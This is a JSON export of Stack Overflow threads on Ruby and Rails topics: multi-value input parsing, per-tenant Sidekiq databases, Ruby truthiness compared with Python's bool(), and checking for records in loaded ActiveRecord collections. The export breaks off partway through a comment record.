[{"tags": ["ruby"], "comments": [{"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 3, "creation_date": 1558567924, "post_id": 56265898, "comment_id": 99148649, "body": "Welcome to SO! We&#39;d like to see your attempt at writing the code in Ruby, sample input and expected output and any errors Ruby gave you, all in the body of the question. Without that it looks like you didn&#39;t try and are fishing for someone to write it for you, which isn&#39;t cool. See &quot;<a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>&quot; for more information."}], "answers": [{"comments": [{"owner": {"reputation": 5134, "user_id": 1672197, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/i8HkV.png?s=128&g=1", "display_name": "orde", "link": "https://stackoverflow.com/users/1672197/orde"}, "edited": false, "score": 1, "creation_date": 1558569623, "post_id": 56265943, "comment_id": 99148929, "body": "If this answer solved your issue, please consider accepting it, which helps keep SO neat and tidy as possible..."}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1558595037, "post_id": 56265943, "comment_id": 99154365, "body": "@Adlane: orde&#39;s comment was for you (in case you didn&#39;t get a red notification about it)"}], "tags": [], "owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "is_accepted": true, "score": 4, "last_activity_date": 1558565389, "creation_date": 1558565389, "answer_id": 56265943, "question_id": 56265898, "link": "https://stackoverflow.com/questions/56265898/how-to-get-multiple-input-from-one-line-in-ruby/56265943#56265943", "title": "How to get multiple input from one line in ruby", "body": "<p>Easiest way would be to read one string, then split it into numbers. Something like this:</p>\n\n<pre><code>print \"Enter three points for the triangle: \"    \nx1, y1, x2, y2, x3, y3 = gets.split.map(&amp;:to_f)\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user11541964"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 56265943, "answer_count": 1, "score": -3, "last_activity_date": 1558565389, "creation_date": 1558565029, "question_id": 56265898, "link": "https://stackoverflow.com/questions/56265898/how-to-get-multiple-input-from-one-line-in-ruby", "title": "How to get multiple input from one line in ruby", "body": "<p>How to get multiple input from one line using ruby.\nI know how to do it using Java.</p>\n\n<pre><code>        System.out.print(\"Enter three points for the triangle: \");\n        double x1=  input.nextDouble();\n        double y1 = input.nextDouble();\n        double x2 = input.nextDouble();\n        double y2 = input.nextDouble();\n        double x3 = input.nextDouble();\n        double y3 = input.nextDouble();\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "database", "postgresql", "sidekiq"], "comments": [{"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1558570218, "post_id": 56264875, "comment_id": 99149058, "body": "I&#39;m confused, where is this <code>config</code> variable being used? Because it is just a local variable"}, {"owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "reply_to_user": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1558571485, "post_id": 56264875, "comment_id": 99149265, "body": "It\u2019s not being used any where. It\u2019s just a variable, I hve taken. Well, I am using establish_connection for configuring the database and it sets the fresh new connection of new database automatically. It reflects in the whole projects automatically on the fly. ( All the models etc calls from the new connected db automatically )"}, {"owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "reply_to_user": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1558571625, "post_id": 56264875, "comment_id": 99149296, "body": "I want to run multiple sidekiq servers for different different databases dynamically. My app is based on the multi subdomain and using the same project instance but having different different database according to subdomain. So, I am not able to find any way of using sidekiq for dynamically connected db connection."}, {"owner": {"reputation": 5118, "user_id": 3893710, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/YaxSL.jpg?s=128&g=1", "display_name": "oreoluwa", "link": "https://stackoverflow.com/users/3893710/oreoluwa"}, "edited": false, "score": 1, "creation_date": 1558571670, "post_id": 56264875, "comment_id": 99149302, "body": "This seems like an architectural problem rather than Sidekiq. In actual fact, Sidekiq doesn&#39;t need to depend on your app to function, i.e. it can be an independent process not using any of your Rails code. Your app sounds like it&#39;s a multi-tenant application, in which case(in my opinion), while creating a new job for Sidekiq to execute, you could as well pass in the identifier for the tenant and then within your job, fetch the connection for the tenant and use that connection."}, {"owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "edited": false, "score": 0, "creation_date": 1558571697, "post_id": 56264875, "comment_id": 99149303, "body": "It\u2019s always taking the configuration from database.yml and I really don\u2019t want that. I just want to pass my database configuration details manually and want sidekiq to work for this db."}, {"owner": {"reputation": 5118, "user_id": 3893710, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/YaxSL.jpg?s=128&g=1", "display_name": "oreoluwa", "link": "https://stackoverflow.com/users/3893710/oreoluwa"}, "edited": false, "score": 1, "creation_date": 1558571937, "post_id": 56264875, "comment_id": 99149337, "body": "Within your running app, aren&#39;t you setting the connection to be used for the different subdomains? If yes, then see my comment above as that should guide you to a solution."}, {"owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "edited": false, "score": 1, "creation_date": 1558572042, "post_id": 56264875, "comment_id": 99149352, "body": "Aha, Something came in mind as per your suggestion. I loved your idea \ud83d\udca1 and you made my day :) Your one hint solved my problem, I guess :D. So @orelouwa, I will use just sidekiq and will paas any identifier or subdomain name with my background job that I want to execute and will make a new connection to database just before executing my function :D make sense ? :)"}, {"owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "reply_to_user": {"reputation": 5118, "user_id": 3893710, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/YaxSL.jpg?s=128&g=1", "display_name": "oreoluwa", "link": "https://stackoverflow.com/users/3893710/oreoluwa"}, "edited": false, "score": 1, "creation_date": 1558572224, "post_id": 56264875, "comment_id": 99149384, "body": "Yeah @oreoluwa, I saw your comment above and it\u2019s exactly helped me and It will save my bulk of hours. [  I am wondering why it have not came in mind \ud83d\ude05] Well done Bro \ud83d\udc4f\ud83c\udffb\ud83d\udc4f\ud83c\udffb\ud83d\udc4f\ud83c\udffb"}], "owner": {"reputation": 56, "user_id": 10574722, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-spg9yLObC_M/AAAAAAAAAAI/AAAAAAAAAdA/e-dXcXNTTZ4/photo.jpg?sz=128", "display_name": "codingnightmare", "link": "https://stackoverflow.com/users/10574722/codingnightmare"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 155, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558560817, "creation_date": 1558558444, "last_edit_date": 1558560817, "question_id": 56264875, "link": "https://stackoverflow.com/questions/56264875/how-to-support-multiple-databases-postgresql-with-sidekiq-server-for-the-same", "title": "How to support multiple databases (postgresql) with Sidekiq server for the same project?", "body": "<p><strong>I want Sidekiq to support multiple dynamic databases for the same project</strong></p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>desc \"Start sending the client invitation\"\n\ntask \"sidekiq:start\", [:database] =&gt; :environment do |task, args|\n  database = args[:database]\n  config = ActiveRecord::Base.establish_connection(\n     :adapter  =&gt; \"postgresql\",\n     :host     =&gt; \"localhost\",\n     :username =&gt; \"postgres\", \n     :password =&gt; 12345678,\n    :database =&gt; database\n  )\n\n  puts \"Start Running Sidkiq Server for new database instance - #{database}\"\n  system(\"bundle exec sidekiq -d -L log/sidekiq.log -P tmp/pids/#{database}_sidekiq.pid\")\n  puts \"Finished Running Sidkiq Server for new database instance - #{database}\"\n\n  puts \"Finished connecting the client sidkiq\"\n\nend\n</code></pre>\n\n<pre><code>rake sidekiq:start[hellodb]\n</code></pre>\n\n<p>Is there anything within sidekiq to pass database configuration dynamically ? </p>\n\n<ul>\n<li>It's always taking the database configuration from database.yml, even I used this establish_connection method. I want it to support database configurations dynamically. </li>\n<li>Basically, I am using multiple databases in my project depending on the sub domains. There, I am using same project but using multiple databases dynamically. So, I am looking for some ability that may allow using multiple sidekiq instances for different databases. </li>\n</ul>\n\n<pre><code>  config = ActiveRecord::Base.establish_connection(\n     :adapter  =&gt; \"postgresql\",\n     :host     =&gt; \"localhost\",\n     :username =&gt; \"postgres\", \n     :password =&gt; 12345678,\n    :database =&gt; database\n  )\n</code></pre>\n\n<p>I will appreciate views on the same :)</p>\n"}, {"tags": ["python", "ruby", "boolean-logic"], "comments": [{"owner": {"reputation": 91121, "user_id": 179125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5594142dcc49a24b1902ec8059181f8d?s=128&d=identicon&r=PG&f=1", "display_name": "Jordan Running", "link": "https://stackoverflow.com/users/179125/jordan-running"}, "edited": false, "score": 3, "creation_date": 1558555899, "post_id": 56264246, "comment_id": 99144943, "body": "Which values in Ruby would you expect to evaluate to <code>true</code> and which to <code>false</code>? Ruby and Python don&#39;t agree on this question (consider not just <code>0</code>, but the empty string, array, range, etc.), so if you want something that behaves like Python you&#39;ll need to write it yourself."}, {"owner": {"reputation": 384463, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 2, "creation_date": 1558555922, "post_id": 56264246, "comment_id": 99144956, "body": "<a href=\"https://stackoverflow.com/q/3028243/1126841\">stackoverflow.com/q/3028243/1126841</a> may be relevant."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558556099, "post_id": 56264246, "comment_id": 99145035, "body": "I wonder if <code>bool(1) #=&gt; true</code> implies that you would expect <code>bool(0) #=&gt; false</code>? What is <code>true</code> or <code>false</code>? What is the expected output or other inputs? Can you please elaborate on this?"}, {"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558568625, "post_id": 56264246, "comment_id": 99148752, "body": "Take a look at <a href=\"https://stackoverflow.com/a/35092232/128421\">stackoverflow.com/a/35092232/128421</a> for a breakdown of how we look at Ruby truth/false."}], "answers": [{"tags": [], "owner": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "is_accepted": true, "score": 9, "last_activity_date": 1558556184, "creation_date": 1558556184, "answer_id": 56264364, "question_id": 56264246, "link": "https://stackoverflow.com/questions/56264246/does-ruby-have-a-bool-function-like-python/56264364#56264364", "title": "Does Ruby have a `bool` function like Python?", "body": "<p>There's always the classic</p>\n\n<pre><code>!!a\n</code></pre>\n\n<p>This also works in Javascript, C++, and (using <code>not</code> instead of <code>!</code>) Python.</p>\n\n<p>Bear in mind that Ruby has different notions of truthiness than Python. In Python, a lot of \"empty\" objects are falsy, and custom classes can have their truthiness determined by a magic method. In Ruby, <em>only</em> <code>nil</code> and <code>false</code> are falsy, and <em>all</em> other values (including numbers, strings, lists, and any user-defined class) are truthy.</p>\n"}, {"comments": [{"owner": {"reputation": 380, "user_id": 3838537, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4dbf714fa6d6114f49582dd36fd6d886?s=128&d=identicon&r=PG", "display_name": "seeker", "link": "https://stackoverflow.com/users/3838537/seeker"}, "edited": false, "score": 0, "creation_date": 1558560515, "post_id": 56264724, "comment_id": 99146840, "body": "Neat custom function, I\u2019ll be sure to use it"}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "reply_to_user": {"reputation": 380, "user_id": 3838537, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4dbf714fa6d6114f49582dd36fd6d886?s=128&d=identicon&r=PG", "display_name": "seeker", "link": "https://stackoverflow.com/users/3838537/seeker"}, "edited": false, "score": 1, "creation_date": 1558570307, "post_id": 56264724, "comment_id": 99149079, "body": "@seeker worth looking at the <code>blank?</code> and <code>present?</code> functions provided by activesupport (in rails) as wel"}], "tags": [], "owner": {"reputation": 4688, "user_id": 6241184, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/1022848011119215/picture?type=large", "display_name": "Vinicius Brasil", "link": "https://stackoverflow.com/users/6241184/vinicius-brasil"}, "is_accepted": false, "score": 3, "last_activity_date": 1558558054, "last_edit_date": 1558558054, "creation_date": 1558557748, "answer_id": 56264724, "question_id": 56264246, "link": "https://stackoverflow.com/questions/56264246/does-ruby-have-a-bool-function-like-python/56264724#56264724", "title": "Does Ruby have a `bool` function like Python?", "body": "<p>If what you want is to <code>1 == true</code> and <code>0 == false</code>, you should explicitly compare the values, such as:</p>\n\n<pre><code>if x == 1\n  # do something\nend\n</code></pre>\n\n<p>That's because, in Ruby, only <code>false</code> and <code>nil</code> are falsy. The rest evaluates to <code>true</code>.</p>\n\n<p>In other words:</p>\n\n<pre><code>def to_bool(x)\n  !!x\nend\n\nto_bool(1)          #=&gt; true\nto_bool(0)          #=&gt; true\nto_bool(\"0\")        #=&gt; true\nto_bool(\"1\")        #=&gt; true\nto_bool(Object.new) #=&gt; true\n\nto_bool(nil)        #=&gt; false\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 380, "user_id": 3838537, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4dbf714fa6d6114f49582dd36fd6d886?s=128&d=identicon&r=PG", "display_name": "seeker", "link": "https://stackoverflow.com/users/3838537/seeker"}, "edited": false, "score": 0, "creation_date": 1558560412, "post_id": 56264743, "comment_id": 99146808, "body": "Thanks, handy to know"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558595962, "post_id": 56264743, "comment_id": 99154781, "body": "There&#39;s also <code>zero?</code> / <code>nonzero?</code>"}, {"owner": {"reputation": 48049, "user_id": 6419007, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/CwqtX.jpg?s=128&g=1", "display_name": "Eric Duminil", "link": "https://stackoverflow.com/users/6419007/eric-duminil"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558596731, "post_id": 56264743, "comment_id": 99155189, "body": "@Stefan: Thanks. It might be confusing to OP though, since <code>nonzero?</code> isn&#39;t the negation of <code>zero?</code>."}], "tags": [], "owner": {"reputation": 48049, "user_id": 6419007, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/CwqtX.jpg?s=128&g=1", "display_name": "Eric Duminil", "link": "https://stackoverflow.com/users/6419007/eric-duminil"}, "is_accepted": false, "score": 3, "last_activity_date": 1558596574, "last_edit_date": 1558596574, "creation_date": 1558557849, "answer_id": 56264743, "question_id": 56264246, "link": "https://stackoverflow.com/questions/56264246/does-ruby-have-a-bool-function-like-python/56264743#56264743", "title": "Does Ruby have a `bool` function like Python?", "body": "<p>If you know which type you'll use, you could try to mimick Python's logic in Ruby.</p>\n\n<p>An empty list, hash or string are truthy in Ruby, so you'll need to check if they're not empty:</p>\n\n<pre><code>![].empty?\n# =&gt; false\n![3].empty?\n# =&gt; true\n!\"\".empty?\n# =&gt; false\n!\"foo\".empty?\n# =&gt; true\n</code></pre>\n\n<p>Likewise, you could check that an integer is not zero:</p>\n\n<pre><code>0 != 0\n#=&gt; false\n1 != 0\n#=&gt; true\n3.14 != 0\n#=&gt; true\n</code></pre>\n"}], "owner": {"reputation": 380, "user_id": 3838537, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4dbf714fa6d6114f49582dd36fd6d886?s=128&d=identicon&r=PG", "display_name": "seeker", "link": "https://stackoverflow.com/users/3838537/seeker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 149, "favorite_count": 0, "accepted_answer_id": 56264364, "answer_count": 3, "score": 2, "last_activity_date": 1558596574, "creation_date": 1558555633, "last_edit_date": 1558568186, "question_id": 56264246, "link": "https://stackoverflow.com/questions/56264246/does-ruby-have-a-bool-function-like-python", "title": "Does Ruby have a `bool` function like Python?", "body": "<p>In Python I can determine the boolean value an expression evaluates to if I use the <code>bool</code> function. For example:</p>\n\n<pre><code>bool(1)\n#=&gt; True\n</code></pre>\n\n<p>Does such a construct exist in Ruby? I can't seem to find evidence that it does. I'm currently having to use equivalence tests to determine boolean values and was wondering if there was more a convenient way of doing this.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord"], "comments": [{"owner": {"reputation": 1670, "user_id": 6388521, "user_type": "registered", "accept_rate": 69, "profile_image": "https://lh4.googleusercontent.com/-VdFWPJVSpRc/AAAAAAAAAAI/AAAAAAAAAFo/vCc8QOz6v9Y/photo.jpg?sz=128", "display_name": "Ruslan", "link": "https://stackoverflow.com/users/6388521/ruslan"}, "edited": false, "score": 0, "creation_date": 1558552893, "post_id": 56263412, "comment_id": 99143622, "body": "If you want to check them in memory, you&#39;d have to iterate, no way around that. Ruby does have <code>find</code> and <code>select</code> methods on array to make that easier"}, {"owner": {"reputation": 51013, "user_id": 976775, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/30bd66ad1795804aebe249d8bcb14409?s=128&d=identicon&r=PG", "display_name": "MrYoshiji", "link": "https://stackoverflow.com/users/976775/mryoshiji"}, "edited": false, "score": 0, "creation_date": 1558555296, "post_id": 56263412, "comment_id": 99144677, "body": "Technically, it may not iterate through <i>all of the items in the list</i>. If you use <code>Array#find</code> (or <code>detect</code> or <code>any?</code>), it will stop iterating at first element found. Example: <code>(1..5).to_a.any? { |i| puts i ; i == 3 }</code> =&gt; it stops iterating once <code>i == 3</code> is true"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558552658, "post_id": 56263518, "comment_id": 99143497, "body": "I tried this on the rails console and it performs another query. I want to be able to check the models already pulled into memory."}, {"owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "reply_to_user": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558552831, "post_id": 56263518, "comment_id": 99143592, "body": "please post example of your code. I don&#39;t know what you mean by &quot;already pulled into memory&quot;"}, {"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558552995, "post_id": 56263518, "comment_id": 99143674, "body": "e.g. I am trying to check existence of an item in <code>items = Item.all()</code>"}, {"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558553335, "post_id": 56263518, "comment_id": 99143831, "body": "It&#39;s still performing a query when I try it in the console."}, {"owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "reply_to_user": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 1, "creation_date": 1558554002, "post_id": 56263518, "comment_id": 99144123, "body": "@DanielChen you need to decide what&#39;s more important and WHEN to hit the database and when to use ruby. Depending on the size of your database, it may be more efficient to use the solution I&#39;ve provided.  If the number of items in the collection are small, then you can use the answer provided below.  You can&#39;t avoid 2 calls of some kind unless you do the filtered query BEFORE you instatiat the collection object."}], "tags": [], "owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "is_accepted": false, "score": 1, "last_activity_date": 1558553057, "last_edit_date": 1558553057, "creation_date": 1558552482, "answer_id": 56263518, "question_id": 56263412, "link": "https://stackoverflow.com/questions/56263412/how-to-check-existence-of-an-activerecord-from-a-query-without-iterating/56263518#56263518", "title": "How to check existence of an ActiveRecord from a query without iterating?", "body": "<p>You can use <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-any-3F\" rel=\"nofollow noreferrer\">ActiveRecord::Relation#any?</a></p>\n\n<pre><code>Item.where(attr1: value1, attr2: value2, attr3: value3).any?\n</code></pre>\n\n<p>If you already have an ActiveRecord relation object, you can still use this approach.  For example if you have this in your controller:</p>\n\n<pre><code>def index\n  @items = Item.all\nend\n</code></pre>\n\n<p>You can do this in your view or wherever:</p>\n\n<pre><code>@items.where(attr1: value1, attr2: value2, attr3: value3).any?\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558553077, "post_id": 56263585, "comment_id": 99143714, "body": "This is how I am currently doing it. However, the documentation says that it is iterating through each element, which I am trying to avoid."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "reply_to_user": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 1, "creation_date": 1558553344, "post_id": 56263585, "comment_id": 99143837, "body": "But you cannot avoid this. How can you check if a specific element is in a list of elements without checking all elements in that list? That might change if you were able to preprocess the list in some way (filtering or sorting). But when you start with  just something like <code>items = Item.all</code> there is no other way but checking against all items in the list."}, {"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558553816, "post_id": 56263585, "comment_id": 99144034, "body": "For an unsorted array this is true, but I&#39;m not sure if a collection of Rails&#39; ActiveRecord data structure behaves exactly like an array."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "reply_to_user": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 1, "creation_date": 1558554040, "post_id": 56263585, "comment_id": 99144138, "body": "After all records were loaded from an <code>ActiveRecord::Relation</code> they are just stored in an &quot;ordinary&quot; array. That said: No, there is no magic that can be used."}], "tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": false, "score": 2, "last_activity_date": 1558552754, "creation_date": 1558552754, "answer_id": 56263585, "question_id": 56263412, "link": "https://stackoverflow.com/questions/56263412/how-to-check-existence-of-an-activerecord-from-a-query-without-iterating/56263585#56263585", "title": "How to check existence of an ActiveRecord from a query without iterating?", "body": "<p>If you have already all items assign to an variable <code>items</code> then you can just use <a href=\"https://ruby-doc.org/core-2.6.3/Enumerable.html#method-i-find\" rel=\"nofollow noreferrer\"><code>find</code></a> (or <code>detect</code>) to search for a matching record in that list without performing another query:</p>\n\n<pre><code>items.find { |item| item.attr1 == value1 &amp;&amp; item.attr2 == value2 &amp;&amp; item.attr3 == value3 w }\n</code></pre>\n\n<p>Note: <code>find</code> returns the first matching record when found, <code>nil</code> otherwise.</p>\n"}, {"comments": [{"owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 2, "creation_date": 1558553527, "post_id": 56263701, "comment_id": 99143925, "body": "Yep, that&#39;s 100% correct. I guess I&#39;m wondering if Rails&#39; ActiveRecord data structure has something under the hood that allows for faster access."}, {"owner": {"reputation": 416, "user_id": 11529593, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-nMOHrxOg4nQ/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfeI-u5UbYJIejKaTCqDSluZAyBDw/mo/photo.jpg?sz=128", "display_name": "Wombologist", "link": "https://stackoverflow.com/users/11529593/wombologist"}, "reply_to_user": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": 